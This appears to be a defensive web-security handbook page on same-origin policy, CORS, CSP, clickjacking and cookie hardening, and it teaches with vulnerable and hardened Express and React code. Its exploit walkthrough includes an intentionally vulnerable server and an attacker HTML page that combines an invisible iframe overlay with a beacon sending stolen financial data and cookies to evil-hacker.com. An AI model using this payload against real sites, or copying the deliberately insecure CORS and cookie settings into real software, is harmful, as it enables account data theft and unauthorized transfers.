# 🌐 Browser and Frontend Security Architecture

> Master guide to client-side threat modeling, browser isolation mechanics, and defense-in-depth architectures for modern enterprise frontend applications.

---

## 📚 Handbook Navigation & Sub-Modules

Dive into dedicated deep-dive guides for each pillar of browser security:

- 🛡️ [**Same-Origin Policy (SOP)**](same-origin-policy.md) — The fundamental browser security boundary, origin computation, cross-origin write/read/embed rules, and safe `postMessage` communication.
- 🚦 [**Cross-Origin Resource Sharing (CORS)**](cross-origin-resource-sharing.md) — Preflight handshakes, credentialed requests, dynamic reflection pitfalls, and zero-trust API origin validation.
- 🪖 [**Content Security Policy (CSP)**](content-security-policy.md) — CSP Level 3, nonce-based script execution, strict CSP blueprints, violation telemetry, and mitigating XSS.
- 🖼️ [**Clickjacking & UI Redressing**](clickjacking.md) — Frame-ancestors, invisible overlay mechanics, double-click hijacking, and modern framing defense.
- 💾 [**Browser Storage Security**](browser-storage-security.md) — Cookies vs. LocalStorage vs. SessionStorage vs. IndexedDB, cookie prefixes (`__Host-`), XSS blast radius, and memory-only token storage patterns.

---

## 1. 🎯 Overview & Intuitive Mental Model

### The Production Hook
The modern web browser is the most hostile execution runtime in distributed computing. Unlike backend services that execute behind firewalls and private VPCs, your frontend application (React, Next.js, Vue, Angular) executes directly on untrusted client hardware inside an adversarial ecosystem populated by third-party tracking scripts, rogue browser extensions, public Wi-Fi interceptors, and phishing iframes. 

A single oversight in browser sandbox configuration can allow an attacker on an unrelated tab to harvest session tokens, silently execute wire transfers, or read confidential healthcare records.

### 🧠 The Fun Analogy: The "Sovereign Embassy Compound"
Imagine every web origin as an independent, sovereign foreign embassy in an international diplomatic zone:
- **Same-Origin Policy (SOP)** is the **Border Control Guard**: It inspects passports containing three credentials: `Scheme`, `Host`, and `Port`. If any single item does not match, you cannot walk into the embassy building and inspect their filing cabinets.
- **CORS** is a **Formal Bilateral Diplomatic Treaty**: An embassy (`api.bank.com`) signs a certified treaty explicitly declaring: *"We permit accredited diplomats carrying passports from `https://app.bank.com` to inspect our public currency rates, but only under mutual pre-agreed terms."*
- **Content Security Policy (CSP)** is the **Embassy Secret Service Inspection Unit**: Every crate of mail or script delivered into the building is scanned. If a courier tries to smuggle in an unauthorized explosive script without the embassy's daily secret cryptographically signed seal (`nonce`), it is immediately incinerated at the front door.
- **Clickjacking Defense (`frame-ancestors`)** is **One-Way Bulletproof Glass**: It prevents an enemy operative from placing a transparent holographic decal over the embassy teller window so that citizens think they are pressing a "Claim Free Coffee" button when they are actually signing an embassy surrender treaty.

### Severity & Blast Radius
- **OWASP Category:** [A01:2021 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/), [A05:2021 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- **Common Weakness Enumerations (CWE):**
  - **CWE-346:** Origin Validation Error
  - **CWE-79:** Improper Neutralization of Input During Web Page Generation (XSS)
  - **CWE-1021:** Improper Restriction of Rendered UI Layers (Clickjacking)
  - **CWE-942:** Permissive Cross-Domain Policy with Untrusted Domains
- **Blast Radius:** Complete account takeover, session hijacking, unauthorized transaction dispatching, customer data exfiltration, and brand destruction.

---

## 2. 🎨 Interactive Visual Architecture

```mermaid
sequenceDiagram
    autonumber
    actor Victim as 👤 Victim User
    participant AttackerSite as 🦹 Attacker Tab (evil-hacker.com)
    participant BrowserSandbox as 🛡️ Browser Sandbox Engine
    participant LegitimateApp as 🏦 Legitimate App (app.bank.com)
    participant BankAPI as 🔐 Gateway & API (api.bank.com)

    Note over Victim,BrowserSandbox: Normal Authenticated Interaction
    Victim->>LegitimateApp: 1. Navigate to app.bank.com
    LegitimateApp->>BrowserSandbox: Render React SPA & Request Credentials
    LegitimateApp->>BankAPI: 2. POST /auth/login {user, pass}
    BankAPI-->>BrowserSandbox: Set-Cookie: sid=s3cr3t; Secure; HttpOnly; SameSite=Strict; __Host-
    Note right of BrowserSandbox: Cookie locked in sandbox to origin: https://app.bank.com

    Note over Victim,AttackerSite: Attack Vector: Cross-Origin / Framing Exploitation
    Victim->>AttackerSite: 3. Victim opens phishing link in background tab
    AttackerSite->>BrowserSandbox: Injects hidden iframe src="https://app.bank.com/transfer"
    
    rect rgb(255, 230, 230)
    Note over BrowserSandbox,BankAPI: Defense Check 1: Clickjacking / Framing
    BrowserSandbox->>BankAPI: Request HTML for iframe
    BankAPI-->>BrowserSandbox: Headers: Content-Security-Policy: frame-ancestors 'none'
    BrowserSandbox--xAttackerSite: 4. BLOCKED: Refused to frame app.bank.com (Sandbox halts render)
    end

    rect rgb(255, 235, 204)
    Note over AttackerSite,BankAPI: Attack Check 2: Unauthorized Cross-Origin fetch()
    AttackerSite->>BrowserSandbox: fetch("https://api.bank.com/account/balance", {credentials: "include"})
    BrowserSandbox->>BankAPI: 5. Preflight OPTIONS (Origin: https://evil-hacker.com)
    BankAPI-->>BrowserSandbox: 6. 403 Forbidden OR CORS headers omitting evil-hacker.com
    BrowserSandbox--xAttackerSite: 7. BLOCKED by SOP & CORS policy (Attacker JS cannot read response)
    end
```

> 💡 **Visual Inspection Tip:** Open Chrome DevTools (`F12`), switch to the **Network** tab, filter by `Fetch/XHR`, and select a request. Check the **Request Headers** for the auto-attached `Origin: https://...` and **Response Headers** for `Access-Control-Allow-Origin`. In the **Application** tab, inspect `Cookies` to verify whether the `HttpOnly`, `Secure`, and `SameSite` flags are marked with green checkmarks or badges.

---

## 3. 💥 Real-World Exploit Walkthrough

### Scenario: The Naive Cross-Origin API & Framing Catastrophe
A startup builds an online banking dashboard using React and Express. To get their frontend working across multiple staging environments and subdomains, developers configured their backend with a dangerous wildcard reflection pattern and failed to enforce frame restrictions.

#### ❌ Vulnerable Backend Configuration (Node.js / Express)
```typescript
// vulnerable-server.ts - DANGEROUS CORS & FRAMING MISCONFIGURATION
import express from 'express';
import cookieParser from 'cookie-parser';

const app = express();
app.use(express.json());
app.use(cookieParser());

// ⚠️ VULNERABILITY 1: Dynamically reflects any incoming Origin header with credentials allowed!
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin) {
    // Arbitrary origin reflection bypasses CORS protections!
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  }
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// ⚠️ VULNERABILITY 2: No anti-framing headers (X-Frame-Options or CSP frame-ancestors)
// ⚠️ VULNERABILITY 3: Insecure cookie settings (SameSite=None, missing __Host- prefix)
app.post('/api/login', (req, res) => {
  res.cookie('session_id', 'user_session_token_xyz987', {
    httpOnly: false, // Insecure: Accessible via document.cookie!
    secure: false,   // Insecure: Transmitted over cleartext HTTP!
    sameSite: 'none' // Insecure: Sent on all cross-site requests!
  });
  res.json({ status: 'authenticated' });
});

app.get('/api/user/financial-data', (req, res) => {
  const sessionId = req.cookies.session_id;
  if (sessionId === 'user_session_token_xyz987') {
    return res.json({
      accountNumber: '9876-5432-1098',
      balanceUSD: 142500.00,
      routingNumber: '121000358',
      ssn: '***-**-6789'
    });
  }
  res.status(401).json({ error: 'Unauthorized' });
});

app.listen(4000, () => console.log('Vulnerable banking server on :4000'));
```

#### ❌ Vulnerable Frontend Dashboard (React / TypeScript)
```tsx
// VulnerableDashboard.tsx
import React, { useEffect, useState } from 'react';

export const VulnerableDashboard: React.FC = () => {
  const [data, setData] = useState<any>(null);

  useEffect(() => {
    // ⚠️ Storing critical access token directly into LocalStorage where any XSS can read it
    const token = localStorage.getItem('auth_token');
    
    fetch('http://localhost:4000/api/user/financial-data', {
      method: 'GET',
      credentials: 'include', // Sends cross-origin cookies
      headers: {
        'Authorization': `Bearer ${token}`
      }
    })
      .then(res => res.json())
      .then(res => setData(res));
  }, []);

  return (
    <div className="dashboard-container">
      <h1>Account Overview</h1>
      {data && (
        <div id="account-info">
          <p>Account: {data.accountNumber}</p>
          <p>Balance: ${data.balanceUSD}</p>
        </div>
      )}
      {/* ⚠️ Button susceptible to Clickjacking if framed */}
      <button 
        id="quick-transfer-btn" 
        onClick={() => fetch('http://localhost:4000/api/transfer', { method: 'POST', credentials: 'include' })}
      >
        Quick 1-Click $10,000 Wire Transfer
      </button>
    </div>
  );
};
```

#### 💥 The Attacker's Exploit Payload
The attacker creates a malicious site `https://evil-hacker.com`:
```html
<!-- evil-hacker.com/exploit.html -->
<!DOCTYPE html>
<html>
<head>
  <title>Congratulations! You Won an iPhone!</title>
  <style>
    /* Clickjacking Overlay CSS */
    .decoy-btn {
      position: absolute;
      top: 150px;
      left: 100px;
      width: 250px;
      height: 60px;
      background: #28a745;
      color: white;
      font-size: 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      z-index: 1;
    }
    .framed-app {
      position: absolute;
      top: 120px;
      left: 80px;
      width: 400px;
      height: 300px;
      opacity: 0.0001; /* Invisible iframe! */
      z-index: 2;
    }
  </style>
</head>
<body>
  <h1>Claim Your Prize Below!</h1>
  <button class="decoy-btn">CLAIM FREE PRIZE</button>

  <!-- Invisible iframe framing the legitimate bank transfer button -->
  <iframe 
    class="framed-app" 
    src="http://localhost:3000/dashboard" 
    scrolling="no">
  </iframe>

  <script>
    // Data exfiltration using CORS vulnerability
    window.addEventListener('load', async () => {
      try {
        const response = await fetch('http://localhost:4000/api/user/financial-data', {
          credentials: 'include'
        });
        const sensitiveData = await response.json();
        
        // Exfiltrate stolen records to attacker's command & control server
        navigator.sendBeacon('https://evil-hacker.com/collect', JSON.stringify({
          stolenData: sensitiveData,
          cookieDump: document.cookie // Empty if HttpOnly, but accessible if not!
        }));
      } catch (err) {
        console.error('CORS blocked access', err);
      }
    });
  </script>
</body>
</html>
```

### Browser Behavior Breakdown
1. **Victim Visits Attacker Page:** The victim user is logged into their bank and opens the attacker's phishing link in another browser tab.
2. **Automatic Credential Attachment:** Because the cookie lacked `SameSite=Strict` or `SameSite=Lax`, and the backend set `Access-Control-Allow-Credentials: true` alongside reflecting `Origin: https://evil-hacker.com`, the browser sends the victim's session cookie with the cross-origin fetch request.
3. **Data Exfiltration:** The browser sandbox permits `evil-hacker.com`'s JavaScript to read the JSON response containing the victim's account number and balance.
4. **Clickjacking Execution:** The victim clicks "CLAIM FREE PRIZE", but clicks directly through the 0.0001 opacity iframe onto the `#quick-transfer-btn`, executing a $10,000 transfer without their knowledge.

---

## 4. 🛡️ Resolution & Defense-in-Depth

### Hardened Production Backend (Node.js / Express with Strict Defense)
```typescript
// hardened-server.ts - PRODUCTION-READY SECURITY BLUEPRINT
import express, { Request, Response, NextFunction } from 'express';
import helmet from 'helmet';
import cors from 'cors';
import cookieParser from 'cookie-parser';

const app = express();

app.use(express.json({ limit: '10kb' })); // Mitigate payload flooding
app.use(cookieParser());

// 🛡️ 1. HTTP Security Headers with Helmet
app.use(
  helmet({
    // Mitigate Clickjacking via Content-Security-Policy
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", 'data:', 'https:'],
        connectSrc: ["'self'", 'https://api.bank.com'],
        // CRITICAL: Restrict framing completely
        frameAncestors: ["'none'"],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        upgradeInsecureRequests: [],
      },
    },
    // Fallback anti-framing header for legacy user-agents
    frameguard: { action: 'deny' },
    // Prevent MIME-sniffing
    noSniff: true,
    // Enforce HTTPS
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
  })
);

// 🛡️ 2. Strict, Deterministic CORS Allowlist
const ALLOWED_ORIGINS = new Set<string>([
  'https://app.bank.com',
  'https://staging.app.bank.com',
]);

const corsOptions: cors.CorsOptions = {
  origin: (requestOrigin, callback) => {
    // Disallow requests with missing Origin (e.g., tools or same-origin non-browser scripts when unexpected)
    // or strictly evaluate against the allowlist
    if (!requestOrigin || ALLOWED_ORIGINS.has(requestOrigin)) {
      callback(null, true);
    } else {
      callback(new Error(`CORS blocked: Origin ${requestOrigin} not permitted.`));
    }
  },
  credentials: true, // Allow cookies only for trusted origins
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'X-CSRF-Token'],
  maxAge: 86400, // Cache preflight response for 24 hours to reduce OPTIONS traffic
};

app.use(cors(corsOptions));

// 🛡️ 3. Hardened Cookie Issuance
app.post('/api/login', (req: Request, res: Response) => {
  // Use prefix '__Host-' for maximum browser sandbox protection:
  // Requires Secure, must come from HTTPS, path must be '/', and domain must NOT be set
  res.cookie('__Host-session_id', 'cryptographically_random_session_token_77a8', {
    httpOnly: true,        // Prevent JavaScript access via XSS
    secure: true,          // Restrict to HTTPS only
    sameSite: 'strict',    // Prevent cross-site request sending (stops CSRF & Cross-Site fetch leaks)
    path: '/',             // Required for __Host- prefix
    maxAge: 3600 * 1000,   // 1 hour expiry
  });

  res.json({ status: 'authenticated' });
});

// Secure API endpoint with origin and session validation
app.get('/api/user/financial-data', (req: Request, res: Response) => {
  const sessionId = req.cookies['__Host-session_id'];
  if (!sessionId) {
    return res.status(401).json({ error: 'Unauthenticated' });
  }

  res.json({
    accountNumber: '9876-5432-1098',
    balanceUSD: 142500.00,
  });
});

export default app;
```

### Hardened Frontend Architecture (React / TypeScript)
```tsx
// HardenedDashboard.tsx - SECURE STORAGE & CONTEXT ENFORCEMENT
import React, { useEffect, useState, useCallback } from 'react';

interface AccountData {
  accountNumber: string;
  balanceUSD: number;
}

export const HardenedDashboard: React.FC = () => {
  const [data, setData] = useState<AccountData | null>(null);
  const [error, setError] = useState<string | null>(null);

  // Safe frame-busting check (Defense-in-depth in case headers fail)
  useEffect(() => {
    if (window.top !== window.self) {
      // App is embedded inside an unauthorized frame!
      window.top!.location.href = window.self.location.href;
    }
  }, []);

  const loadFinancialData = useCallback(async () => {
    try {
      const response = await fetch('https://api.bank.com/api/user/financial-data', {
        method: 'GET',
        // Credentials are included, but protected by SameSite=Strict on the server
        credentials: 'include',
        headers: {
          'Accept': 'application/json',
          'X-Requested-With': 'XMLHttpRequest', // Defense-in-depth header
        },
      });

      if (!response.ok) {
        throw new Error(`API error: ${response.status}`);
      }

      const json = await response.json();
      setData(json);
    } catch (err: any) {
      setError(err.message || 'Failed to fetch financial details');
    }
  }, []);

  useEffect(() => {
    loadFinancialData();
  }, [loadFinancialData]);

  if (error) {
    return <div role="alert" className="error-banner">{error}</div>;
  }

  return (
    <main className="dashboard-root">
      <h1>Secure Account Portal</h1>
      {data ? (
        <section aria-labelledby="account-heading">
          <h2 id="account-heading">Account Summary</h2>
          <p>Account Number: {data.accountNumber}</p>
          <p>Available Balance: ${data.balanceUSD.toLocaleString()}</p>
        </section>
      ) : (
        <p>Loading encrypted financial records...</p>
      )}
    </main>
  );
};
```

### Core Antipatterns vs. Hardened Patterns

| Antipattern ❌ | Security Vulnerability | Hardened Pattern 🛡️ |
|---|---|---|
| `Access-Control-Allow-Origin: *` with credentials | Browsers reject this combination; devs often end up reflecting `req.headers.origin` blindly. | Maintain a strict whitelist of trusted domain strings (`new Set(['https://app.com'])`). |
| Storing refresh or session tokens in `localStorage` | Any minor XSS vulnerability yields permanent account takeover via token extraction. | Store sensitive sessions in `HttpOnly; Secure; SameSite=Strict; __Host-` cookies or memory. |
| Permissive iframe embedding (`X-Frame-Options` omitted) | App can be transparently framed in an overlay, leading to Clickjacking. | Enforce `Content-Security-Policy: frame-ancestors 'none';` via reverse proxy or gateway. |
| Relying only on JavaScript frame-busting scripts | Easily bypassed with sandbox flags (`sandbox="allow-forms allow-scripts"`) on the iframe. | Enforce HTTP response headers (`CSP frame-ancestors 'none'`) at the server level. |

---

## 5. 🧪 Hands-On Verification & Lab

### Local DevTools Walkthrough
1. **Inspect Cookie Sandbox:** Open DevTools > **Application** > **Storage** > **Cookies** > Select your origin.
   - Verify `__Host-session_id` has `HttpOnly` checked.
   - Verify `Secure` is checked.
   - Verify `SameSite` is set to `Strict` or `Lax`.
2. **Inspect Preflight OPTIONS:** In the **Network** tab, trigger a cross-origin `fetch`.
   - Locate the `OPTIONS` request.
   - Verify `Access-Control-Allow-Origin` strictly matches the calling origin and does NOT reflect untrusted origins.
3. **Inspect Frame Restrictions:**
   - Attempt to embed `http://localhost:3000` inside a dummy HTML file (`<iframe src="..."></iframe>`).
   - Open Console: Verify error: `Refused to frame '...' because an ancestor violates the following Content Security Policy directive: "frame-ancestors 'none'"`.

### Automated Testing Suite (Supertest & Jest / Vitest)
```typescript
// browser-security.test.ts
import request from 'supertest';
import app from './hardened-server';

describe('Browser & Frontend Security Policy Suite', () => {
  it('enforces frame-ancestors none and anti-sniff headers', async () => {
    const res = await request(app).get('/api/user/financial-data');

    // Verify CSP frame-ancestors mitigates Clickjacking
    expect(res.headers['content-security-policy']).toContain("frame-ancestors 'none'");
    
    // Verify legacy frameguard header
    expect(res.headers['x-frame-options']).toEqual('DENY');
    
    // Verify MIME sniffing protection
    expect(res.headers['x-content-type-options']).toEqual('nosniff');
  });

  it('rejects cross-origin requests from untrusted origins', async () => {
    const res = await request(app)
      .options('/api/user/financial-data')
      .set('Origin', 'https://evil-hacker.com')
      .set('Access-Control-Request-Method', 'GET');

    // Server should not allow evil-hacker.com
    expect(res.headers['access-control-allow-origin']).toBeUndefined();
  });

  it('allows cross-origin requests from explicitly trusted origins', async () => {
    const res = await request(app)
      .options('/api/user/financial-data')
      .set('Origin', 'https://app.bank.com')
      .set('Access-Control-Request-Method', 'GET');

    expect(res.headers['access-control-allow-origin']).toEqual('https://app.bank.com');
    expect(res.headers['access-control-allow-credentials']).toEqual('true');
  });

  it('issues session cookies with __Host- prefix and strict flags', async () => {
    const res = await request(app).post('/api/login');

    const setCookieHeader = res.headers['set-cookie'][0];
    expect(setCookieHeader).toContain('__Host-session_id=');
    expect(setCookieHeader).toContain('HttpOnly');
    expect(setCookieHeader).toContain('Secure');
    expect(setCookieHeader).toContain('SameSite=Strict');
    expect(setCookieHeader).toContain('Path=/');
  });
});
```

---

## 6. 📋 Code Review Checklist

Use this audit checklist when reviewing pull requests touching frontend routing, API clients, or server header middleware:

- [ ] **SOP & Origin Boundary:** Are cross-origin data exchanges audited? Is `window.postMessage` configured with an explicit target origin (`targetOrigin !== '*'`)?
- [ ] **CORS Verification:** Is the CORS middleware using a strict explicit origin whitelist instead of reflecting `req.headers.origin` or using `*`?
- [ ] **Credential Safety:** Is `Access-Control-Allow-Credentials: true` only enabled on endpoints strictly requiring session state, paired with non-wildcard origins?
- [ ] **Anti-Framing (Clickjacking):** Does every HTML response include `Content-Security-Policy: frame-ancestors 'none';` (or `'self'` if legitimate embedding is required)?
- [ ] **Token Storage Location:** Are long-lived sensitive tokens kept OUT of `localStorage` and `sessionStorage`?
- [ ] **Cookie Hardening:** Are session cookies configured with `HttpOnly`, `Secure`, `SameSite=Strict` (or `Lax`), and the `__Host-` prefix?
- [ ] **CSP Policy:** Is a Content Security Policy deployed with `default-src 'self'`, script nonces or hashes, and restricted `object-src 'none'`?
